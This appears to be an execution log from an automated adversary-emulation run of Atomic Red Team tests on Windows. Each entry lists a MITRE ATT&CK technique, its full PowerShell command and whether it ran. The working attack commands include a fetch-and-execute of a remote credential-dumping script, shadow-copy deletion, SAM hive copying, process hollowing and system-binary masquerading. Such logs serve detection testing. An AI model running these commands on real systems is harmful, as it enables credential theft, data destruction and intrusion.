                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  '
                      ';  $credFile = '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; '
                      'if (Test-Path $credFile) {;     $cred = New-Object '
                      '-TypeName System.Management.Automation.PSCredential '
                      '-ArgumentList $env:USERNAME, (Get-Content $credFile | '
                      'ConvertTo-SecureString);     '
                      'if($cred.GetNetworkCredential().Password -eq '
                      '"UPPER-LONG-SPECIAL-333"){;       Write-Host '
                      '-ForegroundColor Yellow "The new password is the same '
                      'as the password stored in the credential file. Please '
                      'specify a different new password."; exit -1;     };     '
                      'try {;         $newPassword = ConvertTo-SecureString '
                      'UPPER-LONG-SPECIAL-333 -AsPlainText -Force;         '
                      'Set-ADAccountPassword -Identity $env:USERNAME '
                      '-OldPassword $cred.password -NewPassword '
                      '$newPassword;     };     catch { ;         '
                      '$_.Exception;         $errCode = '
                      '$_.Exception.ErrorCode;         Write-Host "Error code: '
                      '$errCode";         if ($errCode -eq 86) {;             '
                      'Write-Host -ForegroundColor Yellow "The stored password '
                      'for the current user is incorrect. Please run the '
                      'prereq commands to set the correct '
                      'credentials";             Remove-Item '
                      '$credFile;         };         exit $errCode;     };     '
                      'Write-Host -ForegroundColor Cyan "Successfully changed '
                      'the password to UPPER-LONG-SPECIAL-333";     $newCred = '
                      'New-Object System.Management.Automation.PSCredential '
                      '($env:USERNAME, $(ConvertTo-SecureString '
                      '"UPPER-LONG-SPECIAL-333" -AsPlainText -Force));     '
                      '$newCred.Password | ConvertFrom-SecureString | Out-File '
                      '$credFile; }; else {;     Write-Host -ForegroundColor '
                      'Yellow "You must store the password of the current user '
                      'by running the prerequisite commands first"; }',
 'platform': 'windows',
 'run': '2023-11-29T12:58:01Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1106__execution__native_api__2ca71106ee0aff2eda551bb6ed2b39e4__trial_1

atomic_ordering: ['2ca71106ee0aff2eda551bb6ed2b39e4']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1055_012__multiple__process_injection-_process_hollowing__5fef676a9954938537bd1e2191d3e9b5__trial_1

atomic_ordering: ['5fef676a9954938537bd1e2191d3e9b5']
------------------------------
{'ability_id': '5fef676a9954938537bd1e2191d3e9b5',
 'agent_reported_time': '2023-11-11T13:10:30Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1055.012',
            'technique_name': 'Process Injection: Process Hollowing'},
 'command': '. "$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1"; '
            '$ppid=Get-Process explorer | select -expand id; Start-Hollow '
            '-Sponsor "C:\\Windows\\System32\\notepad.exe" -Hollow '
            '"C:\\Windows\\System32\\cmd.exe" -ParentPID $ppid -Verbose',
 'delegated': '2023-11-28T02:07:59Z',
 'description': 'This test uses PowerShell to create a Hollow from a PE on '
                'disk with explorer as the parent.\n'
                'Credit to FuzzySecurity '
                '(https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n',
 'executor': 'psh',
 'link_id': 'c1fada2d-7402-4ea1-aced-94d60f4b16c8',
 'name': 'Process Hollowing using PowerShell',
 'pid': 1444,
 'plaintext_command': '. '
                      '"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1"; '
                      '$ppid=Get-Process explorer | select -expand id; '
                      'Start-Hollow -Sponsor '
                      '"C:\\Windows\\System32\\notepad.exe" -Hollow '
                      '"C:\\Windows\\System32\\cmd.exe" -ParentPID $ppid '
                      '-Verbose',
 'platform': 'windows',
 'run': '2023-11-28T02:09:00Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1490__impact__inhibit_system_recovery__e90756bb6dcd21462dc4cc452661df91__trial_1

atomic_ordering: ['e90756bb6dcd21462dc4cc452661df91']
------------------------------
{'ability_id': 'e90756bb6dcd21462dc4cc452661df91',
 'agent_reported_time': '2023-11-11T13:10:27Z',
 'attack': {'tactic': 'impact',
            'technique_id': 'T1490',
            'technique_name': 'Inhibit System Recovery'},
 'command': 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}',
 'delegated': '2023-12-01T10:24:24Z',
 'description': 'Deletes Windows Volume Shadow Copies with PowerShell code and '
                'Get-WMIObject.\n'
                'This technique is used by numerous ransomware families such '
                'as Sodinokibi/REvil.\n'
                'Executes Get-WMIObject. Shadow copies can only be created on '
                'Windows server or Windows 8, so upon execution\n'
                'there may be no output displayed.\n',
 'executor': 'psh',
 'link_id': '4d93983e-34ac-4c4c-9f92-dbe715ff5fae',
 'name': 'Windows - Delete Volume Shadow Copies via WMI with PowerShell',
 'pid': 5416,
 'plaintext_command': 'Get-WmiObject Win32_Shadowcopy | ForEach-Object '
                      '{$_.Delete();}',
 'platform': 'windows',
 'run': '2023-12-01T10:25:10Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__ae8bd61cb6d10568145c87134e95c96f__trial_1

atomic_ordering: ['ae8bd61cb6d10568145c87134e95c96f']
==============================
==============================
adversary_id: atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__745d16045bcf10379b8cf2fa45f2b66e__trial_1

atomic_ordering: ['745d16045bcf10379b8cf2fa45f2b66e']
==============================
==============================
adversary_id: atomic__t1083__discovery__file_and_directory_discovery__1033c974479429c54dff4470e614113d__trial_1

atomic_ordering: ['1033c974479429c54dff4470e614113d']
------------------------------
{'ability_id': '1033c974479429c54dff4470e614113d',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1083',
            'technique_name': 'File and Directory Discovery'},
 'command': '$folderarray = @("Desktop", "Downloads", "Documents", '
            '"AppData/Local", "AppData/Roaming"); Get-ChildItem -Path '
            '$env:homedrive -ErrorAction SilentlyContinue | Out-File -append '
            '$env:temp\\T1083Test5.txt; Get-ChildItem -Path $env:programfiles '
            '-erroraction silentlycontinue | Out-File -append '
            '$env:temp\\T1083Test5.txt; Get-ChildItem -Path '
            '"${env:ProgramFiles(x86)}" -erroraction silentlycontinue | '
            'Out-File -append $env:temp\\T1083Test5.txt; $UsersFolder = '
            '"$env:homedrive\\Users\\"; foreach ($directory in Get-ChildItem '
            '-Path $UsersFolder -ErrorAction SilentlyContinue) ; {; foreach '
            '($secondarydirectory in $folderarray);  {Get-ChildItem -Path '
            '"$UsersFolder/$directory/$secondarydirectory" -ErrorAction '
            'SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt}; '
            '}; cat $env:temp\\T1083Test5.txt',
 'delegated': '2023-11-29T04:16:18Z',
 'description': "This test emulates MAZE ransomware's ability to enumerate "
                'directories using Powershell. \n'
                'Upon successful execution, this test will output the '
                'directory enumeration results to a specified file, as well as '
                'display them in the active window. \n'
                'See '
                'https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n',
 'executor': 'psh',
 'link_id': '0925ceae-d776-4a6d-955f-0c495dc0d70a',
 'name': 'Simulating MAZE Directory Enumeration',
 'pid': 10992,
 'plaintext_command': '$folderarray = @("Desktop", "Downloads", "Documents", '
                      '"AppData/Local", "AppData/Roaming"); Get-ChildItem '
                      '-Path $env:homedrive -ErrorAction SilentlyContinue | '
                      'Out-File -append $env:temp\\T1083Test5.txt; '
                      'Get-ChildItem -Path $env:programfiles -erroraction '
                      'silentlycontinue | Out-File -append '
                      '$env:temp\\T1083Test5.txt; Get-ChildItem -Path '
                      '"${env:ProgramFiles(x86)}" -erroraction '
                      'silentlycontinue | Out-File -append '
                      '$env:temp\\T1083Test5.txt; $UsersFolder = '
                      '"$env:homedrive\\Users\\"; foreach ($directory in '
                      'Get-ChildItem -Path $UsersFolder -ErrorAction '
                      'SilentlyContinue) ; {; foreach ($secondarydirectory in '
                      '$folderarray);  {Get-ChildItem -Path '
                      '"$UsersFolder/$directory/$secondarydirectory" '
                      '-ErrorAction SilentlyContinue | Out-File -append '
                      '$env:temp\\T1083Test5.txt}; }; cat '
                      '$env:temp\\T1083Test5.txt',
 'platform': 'windows',
 'run': '2023-11-29T04:16:43Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__9ccef9b46ce26850bb709a83d8e538ae__trial_1

atomic_ordering: ['9ccef9b46ce26850bb709a83d8e538ae']
------------------------------
{'ability_id': '9ccef9b46ce26850bb709a83d8e538ae',
 'agent_reported_time': '2023-11-11T13:08:51Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.002',
            'technique_name': 'Account Discovery: Domain Account'},
 'command': 'Invoke-Expression '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1"',
 'delegated': '2023-11-29T07:49:23Z',
 'description': 'ADRecon extracts and combines information about an AD '
                'environement into a report. Upon execution, an Excel file '
                'with all of the data will be generated and its\n'
                'path will be displayed.\n',
 'executor': 'psh',
 'link_id': '342a950d-3ac7-4f4e-8e68-49d7069c201f',
 'name': 'Automated AD Recon (ADRecon)',
 'pid': 4992,
 'plaintext_command': 'Invoke-Expression '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1"',
 'platform': 'windows',
 'run': '2023-11-29T07:49:43Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1071_004__command-and-control__application_layer_protocol-_dns__ce2eccff2f1de0096efa0da778a7e27c__trial_1

atomic_ordering: ['ce2eccff2f1de0096efa0da778a7e27c']
------------------------------
{'ability_id': 'ce2eccff2f1de0096efa0da778a7e27c',
 'agent_reported_time': '2023-11-11T13:10:36Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1071.004',
            'technique_name': 'Application Layer Protocol: DNS'},
 'command': 'Set-Location "PathToAtomicsFolder"; '
            '.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain '
            '127.0.0.1.nip.io -Subdomain '
            'atomicredteamatomicredteamatomicredteamatomicredteamatomicredte '
            '-QueryType TXT',
 'delegated': '2023-11-28T22:28:44Z',
 'description': 'This test simulates an infected host returning data to a '
                'command and control server using long domain names.\n'
                'The simulation involves sending DNS queries that gradually '
                'increase in length until reaching the maximum length. The '
                'intent is to test the effectiveness of detection of DNS '
                'queries for long domain names over a set threshold.\n'
                ' Upon execution, DNS information about the domain will be '
                'displayed for each callout.\n',
 'executor': 'psh',
 'link_id': '26c37f8b-9043-4c86-8630-35e64c956b94',
 'name': 'DNS Long Domain Query',
 'pid': 6340,
 'plaintext_command': 'Set-Location "PathToAtomicsFolder"; '
                      '.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain '
                      '127.0.0.1.nip.io -Subdomain '
                      'atomicredteamatomicredteamatomicredteamatomicredteamatomicredte '
                      '-QueryType TXT',
 'platform': 'windows',
 'run': '2023-11-28T22:29:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1074_001__collection__data_staged-_local_data_staging__885997e230cb2b9dc3cc7e9d8ec5a6d8__trial_1

atomic_ordering: ['885997e230cb2b9dc3cc7e9d8ec5a6d8']
------------------------------
{'ability_id': '885997e230cb2b9dc3cc7e9d8ec5a6d8',
 'agent_reported_time': '2023-11-11T13:08:19Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1074.001',
            'technique_name': 'Data Staged: Local Data Staging'},
 'command': 'Compress-Archive -Path '
            '"PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip" '
            '-DestinationPath $env:TEMP\\Folder_to_zip.zip -Force',
 'delegated': '2023-11-28T23:05:57Z',
 'description': 'Use living off the land tools to zip a file and stage it in '
                'the Windows temporary folder for later exfiltration. Upon '
                'execution, Verify that a zipped folder named '
                'Folder_to_zip.zip\n'
                'was placed in the temp directory.\n',
 'executor': 'psh',
 'link_id': 'da1fb083-1072-41a0-88a6-a8d659fdcb23',
 'name': 'Zip a Folder with PowerShell for Staging in Temp',
 'pid': 6048,
 'plaintext_command': 'Compress-Archive -Path '
                      '"PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip" '
                      '-DestinationPath $env:TEMP\\Folder_to_zip.zip -Force',
 'platform': 'windows',
 'run': '2023-11-28T23:06:18Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__3aae7c6d210ffb084186f1686a1f00c1__trial_1

atomic_ordering: ['3aae7c6d210ffb084186f1686a1f00c1']
------------------------------
{'ability_id': '3aae7c6d210ffb084186f1686a1f00c1',
 'agent_reported_time': '2023-11-11T13:10:13Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1098',
            'technique_name': 'Account Manipulation'},
 'command': 'if (Test-Path '
            '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else '
            '{New-Item -Type Directory (split-path '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
            '-ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  '
            '$env:USERNAME -message "Enter password for $env:USERNAME to use '
            'during password change attempt"; $cred.Password | '
            'ConvertFrom-SecureString | Out-File '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  ;  '
            '$credFile = '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; if '
            '(Test-Path $credFile) {;     $cred = New-Object -TypeName '
            'System.Management.Automation.PSCredential -ArgumentList '
            '$env:USERNAME, (Get-Content $credFile | '
            'ConvertTo-SecureString);     '
            'if($cred.GetNetworkCredential().Password -eq '
            '"Spring$((Get-Date).Year)!"){;       Write-Host -ForegroundColor '
            'Yellow "The new password is the same as the password stored in '
            'the credential file. Please specify a different new password."; '
            'exit -1;     };     try {;         $newPassword = '
            'ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText '
            '-Force;         Set-ADAccountPassword -Identity $env:USERNAME '
            '-OldPassword $cred.password -NewPassword $newPassword;     };     '
            'catch { ;         $_.Exception;         $errCode = '
            '$_.Exception.ErrorCode;         Write-Host "Error code: '
            '$errCode";         if ($errCode -eq 86) {;             Write-Host '
            '-ForegroundColor Yellow "The stored password for the current user '
            'is incorrect. Please run the prereq commands to set the correct '
            'credentials";             Remove-Item $credFile;         '
            '};         exit $errCode;     };     Write-Host -ForegroundColor '
            'Cyan "Successfully changed the password to '
            'Spring$((Get-Date).Year)!";     $newCred = New-Object '
            'System.Management.Automation.PSCredential ($env:USERNAME, '
            '$(ConvertTo-SecureString "Spring$((Get-Date).Year)!" -AsPlainText '
            '-Force));     $newCred.Password | ConvertFrom-SecureString | '
            'Out-File $credFile; }; else {;     Write-Host -ForegroundColor '
            'Yellow "You must store the password of the current user by '
            'running the prerequisite commands first"; }',
 'delegated': '2023-11-29T13:36:58Z',
 'description': 'Attempt to change the password of the current domain user in '
                'order to check password policy. Ideally, you would only run '
                'this atomic test to verify that your password policy is '
                'blocking the use of the new password.\n'
                'If the password is succesfully changed to the new password, '
                'the credential file will be updated to reflect the new '
                'password. You can then run the atomic manually and specify a '
                'new password of your choosing, however the\n'
                'password policy will likely prevent you from setting the '
                'password back to what it was. \n',
 'executor': 'psh',
 'link_id': '349ca0e8-9f27-4184-a616-15d0b6b7a867',
 'name': 'Domain Password Policy Check: Common Password Use',
 'pid': 3240,
 'plaintext_command': 'if (Test-Path '
                      '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { '
                      '; } else {New-Item -Type Directory (split-path '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
                      '-ErrorAction Ignore | Out-Null; $cred = Get-Credential '
                      '-UserName  $env:USERNAME -message "Enter password for '
                      '$env:USERNAME to use during password change attempt"; '
                      '$cred.Password | ConvertFrom-SecureString | Out-File '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  '
                      ';  $credFile = '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; '
                      'if (Test-Path $credFile) {;     $cred = New-Object '
                      '-TypeName System.Management.Automation.PSCredential '
                      '-ArgumentList $env:USERNAME, (Get-Content $credFile | '
                      'ConvertTo-SecureString);     '
                      'if($cred.GetNetworkCredential().Password -eq '
                      '"Spring$((Get-Date).Year)!"){;       Write-Host '
                      '-ForegroundColor Yellow "The new password is the same '
                      'as the password stored in the credential file. Please '
                      'specify a different new password."; exit -1;     };     '
                      'try {;         $newPassword = ConvertTo-SecureString '
                      'Spring$((Get-Date).Year)! -AsPlainText -Force;         '
                      'Set-ADAccountPassword -Identity $env:USERNAME '
                      '-OldPassword $cred.password -NewPassword '
                      '$newPassword;     };     catch { ;         '
                      '$_.Exception;         $errCode = '
                      '$_.Exception.ErrorCode;         Write-Host "Error code: '
                      '$errCode";         if ($errCode -eq 86) {;             '
                      'Write-Host -ForegroundColor Yellow "The stored password '
                      'for the current user is incorrect. Please run the '
                      'prereq commands to set the correct '
                      'credentials";             Remove-Item '
                      '$credFile;         };         exit $errCode;     };     '
                      'Write-Host -ForegroundColor Cyan "Successfully changed '
                      'the password to Spring$((Get-Date).Year)!";     '
                      '$newCred = New-Object '
                      'System.Management.Automation.PSCredential '
                      '($env:USERNAME, $(ConvertTo-SecureString '
                      '"Spring$((Get-Date).Year)!" -AsPlainText -Force));     '
                      '$newCred.Password | ConvertFrom-SecureString | Out-File '
                      '$credFile; }; else {;     Write-Host -ForegroundColor '
                      'Yellow "You must store the password of the current user '
                      'by running the prerequisite commands first"; }',
 'platform': 'windows',
 'run': '2023-11-29T13:37:30Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__3c9dee6c65974cc3b4f34d0a5d1b6992__trial_1

atomic_ordering: ['3c9dee6c65974cc3b4f34d0a5d1b6992']
------------------------------
{'ability_id': '3c9dee6c65974cc3b4f34d0a5d1b6992',
 'agent_reported_time': '2023-11-11T13:10:07Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1553.005',
            'technique_name': 'Subvert Trust Controls: Mark-of-the-Web Bypass'},
 'command': 'Mount-DiskImage -ImagePath "5fad3e_T1553.005.iso"',
 'delegated': '2023-12-02T19:59:19Z',
 'description': 'Mounts ISO image downloaded from internet to evade '
                'Mark-of-the-Web. Upon successful execution, powershell will '
                'download the .iso from the Atomic Red Team repo, and mount '
                'the image. The provided sample ISO simply has a Reports '
                'shortcut file in it. Reference: '
                'https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n',
 'executor': 'psh',
 'link_id': 'a659b9ad-9b7a-43e3-a7ad-2324d5fd32bc',
 'name': 'Mount ISO image',
 'pid': 7344,
 'plaintext_command': 'Mount-DiskImage -ImagePath "5fad3e_T1553.005.iso"',
 'platform': 'windows',
 'run': '2023-12-02T19:59:47Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555__credential-access__credentials_from_password_stores__9d0478981edda6091f911a1305025bde__trial_1

atomic_ordering: ['9d0478981edda6091f911a1305025bde']
------------------------------
{'ability_id': '9d0478981edda6091f911a1305025bde',
 'agent_reported_time': '2023-11-11T13:10:06Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555',
            'technique_name': 'Credentials from Password Stores'},
 'command': 'IEX (IWR '
            "'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' "
            '-UseBasicParsing); Get-CredManCreds -Force',
 'delegated': '2023-12-03T02:27:38Z',
 'description': 'This module will extract the credentials from Windows '
                'Credential Manager',
 'executor': 'psh',
 'link_id': '96b9b018-2c7e-4fbc-b290-c57b7b545716',
 'name': 'Dump credentials from Windows Credential Manager With PowerShell '
         '[web Credentials]',
 'pid': 8936,
 'plaintext_command': 'IEX (IWR '
                      "'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' "
                      '-UseBasicParsing); Get-CredManCreds -Force',
 'platform': 'windows',
 'run': '2023-12-03T02:28:01Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__015d186adee85e65d7255b383e1a039f__trial_1

atomic_ordering: ['015d186adee85e65d7255b383e1a039f']
------------------------------
{'ability_id': '015d186adee85e65d7255b383e1a039f',
 'agent_reported_time': '2023-11-11T13:09:31Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1098',
            'technique_name': 'Account Manipulation'},
 'command': 'if (Test-Path '
            '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else '
            '{New-Item -Type Directory (split-path '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
            '-ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  '
            '$env:USERNAME -message "Enter password for $env:USERNAME to use '
            'during password change attempt"; $cred.Password | '
            'ConvertFrom-SecureString | Out-File '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  ;  '
            '$credFile = '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; if '
            '(Test-Path $credFile) {;     $cred = New-Object -TypeName '
            'System.Management.Automation.PSCredential -ArgumentList '
            '$env:USERNAME, (Get-Content $credFile | '
            'ConvertTo-SecureString);     '
            'if($cred.GetNetworkCredential().Password -eq '
            '"UpperLowerLong333noSpecialChar"){;       Write-Host '
            '-ForegroundColor Yellow "The new password is the same as the '
            'password stored in the credential file. Please specify a '
            'different new password."; exit -1;     };     try {;         '
            '$newPassword = ConvertTo-SecureString '
            'UpperLowerLong333noSpecialChar -AsPlainText -Force;         '
            'Set-ADAccountPassword -Identity $env:USERNAME -OldPassword '
            '$cred.password -NewPassword $newPassword;     };     catch { '
            ';         $_.Exception;         $errCode = '
            '$_.Exception.ErrorCode;         Write-Host "Error code: '
            '$errCode";         if ($errCode -eq 86) {;             Write-Host '
            '-ForegroundColor Yellow "The stored password for the current user '
            'is incorrect. Please run the prereq commands to set the correct '
            'credentials";             Remove-Item $credFile;         '
            '};         exit $errCode;     };     Write-Host -ForegroundColor '
            'Cyan "Successfully changed the password to '
            'UpperLowerLong333noSpecialChar";     $newCred = New-Object '
            'System.Management.Automation.PSCredential ($env:USERNAME, '
            '$(ConvertTo-SecureString "UpperLowerLong333noSpecialChar" '
            '-AsPlainText -Force));     $newCred.Password | '
            'ConvertFrom-SecureString | Out-File $credFile; }; else {;     '
            'Write-Host -ForegroundColor Yellow "You must store the password '
            'of the current user by running the prerequisite commands first"; '
            '}',
 'delegated': '2023-11-29T12:38:27Z',
 'description': 'Attempt to change the password of the current domain user in '
                'order to check password policy. Ideally, you would only run '
                'this atomic test to verify that your password policy is '
                'blocking the use of the new password.\n'
                'If the password is succesfully changed to the new password, '
                'the credential file will be updated to reflect the new '
                'password. You can then run the atomic manually and specify a '
                'new password of your choosing, however the\n'
                'password policy will likely prevent you from setting the '
                'password back to what it was. \n',
 'executor': 'psh',
 'link_id': '003110cb-5db6-4606-8c42-876ef57e2e5d',
 'name': 'Domain Password Policy Check: No Special Character in Password',
 'pid': 7056,
 'plaintext_command': 'if (Test-Path '
                      '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { '
                      '; } else {New-Item -Type Directory (split-path '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
                      '-ErrorAction Ignore | Out-Null; $cred = Get-Credential '
                      '-UserName  $env:USERNAME -message "Enter password for '
                      '$env:USERNAME to use during password change attempt"; '
                      '$cred.Password | ConvertFrom-SecureString | Out-File '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  '
                      ';  $credFile = '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; '
                      'if (Test-Path $credFile) {;     $cred = New-Object '
                      '-TypeName System.Management.Automation.PSCredential '
                      '-ArgumentList $env:USERNAME, (Get-Content $credFile | '
                      'ConvertTo-SecureString);     '
                      'if($cred.GetNetworkCredential().Password -eq '
                      '"UpperLowerLong333noSpecialChar"){;       Write-Host '
                      '-ForegroundColor Yellow "The new password is the same '
                      'as the password stored in the credential file. Please '
                      'specify a different new password."; exit -1;     };     '
                      'try {;         $newPassword = ConvertTo-SecureString '
                      'UpperLowerLong333noSpecialChar -AsPlainText '
                      '-Force;         Set-ADAccountPassword -Identity '
                      '$env:USERNAME -OldPassword $cred.password -NewPassword '
                      '$newPassword;     };     catch { ;         '
                      '$_.Exception;         $errCode = '
                      '$_.Exception.ErrorCode;         Write-Host "Error code: '
                      '$errCode";         if ($errCode -eq 86) {;             '
                      'Write-Host -ForegroundColor Yellow "The stored password '
                      'for the current user is incorrect. Please run the '
                      'prereq commands to set the correct '
                      'credentials";             Remove-Item '
                      '$credFile;         };         exit $errCode;     };     '
                      'Write-Host -ForegroundColor Cyan "Successfully changed '
                      'the password to UpperLowerLong333noSpecialChar";     '
                      '$newCred = New-Object '
                      'System.Management.Automation.PSCredential '
                      '($env:USERNAME, $(ConvertTo-SecureString '
                      '"UpperLowerLong333noSpecialChar" -AsPlainText '
                      '-Force));     $newCred.Password | '
                      'ConvertFrom-SecureString | Out-File $credFile; }; else '
                      '{;     Write-Host -ForegroundColor Yellow "You must '
                      'store the password of the current user by running the '
                      'prerequisite commands first"; }',
 'platform': 'windows',
 'run': '2023-11-29T12:39:03Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__69219b448ba0a75bae573d58d8b6cf40__trial_1

atomic_ordering: ['69219b448ba0a75bae573d58d8b6cf40']
------------------------------
{'ability_id': '69219b448ba0a75bae573d58d8b6cf40',
 'agent_reported_time': '2023-11-11T13:09:32Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1003.002',
            'technique_name': 'OS Credential Dumping: Security Account '
                              'Manager'},
 'command': '1..10 | % { ;  try { '
            '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
            ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
            '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
 'delegated': '2023-11-27T05:47:27Z',
 'description': 'Dump hives from volume shadow copies with System.IO.File. '
                '[CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n',
 'executor': 'psh',
 'link_id': 'e16fb950-41fd-41c9-a29d-2b4acce1901f',
 'name': 'dump volume shadow copy hives with System.IO.File',
 'pid': 9672,
 'plaintext_command': '1..10 | % { ;  try { '
                      '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
                      ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
                      '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
 'platform': 'windows',
 'run': '2023-11-27T05:47:31Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1036_003__defense-evasion__masquerading-_rename_system_utilities__4bb550aacec4efb190c72389677b7f4e__trial_1

atomic_ordering: ['4bb550aacec4efb190c72389677b7f4e']
------------------------------
{'ability_id': '4bb550aacec4efb190c72389677b7f4e',
 'agent_reported_time': '2023-11-11T13:10:40Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1036.003',
            'technique_name': 'Masquerading: Rename System Utilities'},
 'command': 'copy "$env:ComSpec" ($env:TEMP + "\\svchost.exe"); $myT1036_003 = '
            '(Start-Process -PassThru -FilePath ($env:TEMP + '
            '"\\svchost.exe")).Id; Stop-Process -ID $myT1036_003',
 'delegated': '2023-11-27T15:08:52Z',
 'description': 'Copies a windows exe, renames it as another windows exe, and '
                'launches it to masquerade as second windows exe\n',
 'executor': 'psh',
 'link_id': '88580e62-90fc-4da1-b19f-2b2eda3b0ffc',
 'name': 'Masquerading - windows exe running as different windows exe',
 'pid': 6464,
 'plaintext_command': 'copy "$env:ComSpec" ($env:TEMP + "\\svchost.exe"); '
                      '$myT1036_003 = (Start-Process -PassThru -FilePath '
                      '($env:TEMP + "\\svchost.exe")).Id; Stop-Process -ID '
                      '$myT1036_003',
 'platform': 'windows',
 'run': '2023-11-27T15:09:30Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1070_005__defense-evasion__indicator_removal_on_host-_network_share_connection_removal__6940ffd670787cd1c410997e66629573__trial_1

atomic_ordering: ['6940ffd670787cd1c410997e66629573']
------------------------------
{'ability_id': '6940ffd670787cd1c410997e66629573',
 'agent_reported_time': '2023-11-11T13:10:40Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.005',
            'technique_name': 'Indicator Removal on Host: Network Share '
                              'Connection Removal'},
 'command': 'Remove-SmbShare -Name \\\\test\\share; Remove-FileShare -Name '
            '\\\\test\\share',
 'delegated': '2023-11-28T18:35:48Z',
 'description': 'Removes a Network Share utilizing PowerShell\n',
 'executor': 'psh',
 'link_id': '0237a15c-ec2e-45db-9813-97eed4bf7831',
 'name': 'Remove Network Share PowerShell',
 'pid': 7704,
 'plaintext_command': 'Remove-SmbShare -Name \\\\test\\share; Remove-FileShare '
                      '-Name \\\\test\\share',
 'platform': 'windows',
 'run': '2023-11-28T18:36:50Z',
 'status': 1}
